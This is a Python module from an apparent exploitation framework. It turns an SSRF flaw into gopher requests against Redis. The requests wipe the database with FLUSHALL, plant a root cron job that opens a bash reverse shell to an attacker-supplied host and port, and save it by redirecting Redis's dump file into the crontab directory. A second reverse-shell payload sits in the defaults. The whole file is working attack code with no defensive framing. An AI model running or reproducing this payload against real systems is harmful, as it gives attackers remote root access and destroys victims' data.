from modules.exploit_manager import BaseModule
from utils.logger import Logger
import urllib.parse

class RedisExploit(BaseModule):
    """
    Exploits Redis via gopher protocol to achieve RCE or data manipulation.
    Commonly used to write a cron job or an SSH key.
    """
    def __init__(self, engine):
        super().__init__(engine)
        self.default_payload = [
            "FLUSHALL",
            "SET socat \"/bin/sh -c 'sh -i >& /dev/tcp/LHOST/LPORT 0>&1'\"",
            "CONFIG SET dir /var/spool/cron/crontabs",
            "CONFIG SET dbfilename root",
            "SAVE",
            "QUIT"
        ]

    def _generate_gopher_payload(self, commands: list, host: str = "127.0.0.1", port: int = 6379) -> str:
        payload = ""
        for cmd in commands:
            payload += f"{cmd}\r\n"
        
        encoded_payload = urllib.parse.quote(payload)
        # Gopher needs double encoding for some SSRF scenarios
        return f"gopher://{host}:{port}/_{encoded_payload}"

    async def run(self, target_url: str, **kwargs):
        lhost = kwargs.get("lhost")
        lport = kwargs.get("lport", "4444")
        redis_host = kwargs.get("redis_host", "127.0.0.1")
        redis_port = kwargs.get("redis_port", 6379)

        if not lhost:
            Logger.error("LHOST is required for Redis RCE (cron job).")
            return {"error": "LHOST missing"}

        commands = [
            "FLUSHALL",
            f"SET shell \"\n\n* * * * * /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n\n\"",
            "CONFIG SET dir /var/spool/cron/crontabs",
            "CONFIG SET dbfilename root",
            "SAVE",
            "QUIT"
        ]

        gopher_payload = self._generate_gopher_payload(commands, redis_host, redis_port)
        Logger.info(f"Targeting Redis at {redis_host}:{redis_port} via Gopher...")
        
        res = await self.engine.get(target_url.replace("SSRF", gopher_payload))
        
        if res.get("status"):
            Logger.success("Redis exploitation payload sent. Check your listener.")
            return {"status": "payload_sent", "payload": gopher_payload}
        
        return {"error": "Failed to send payload"}
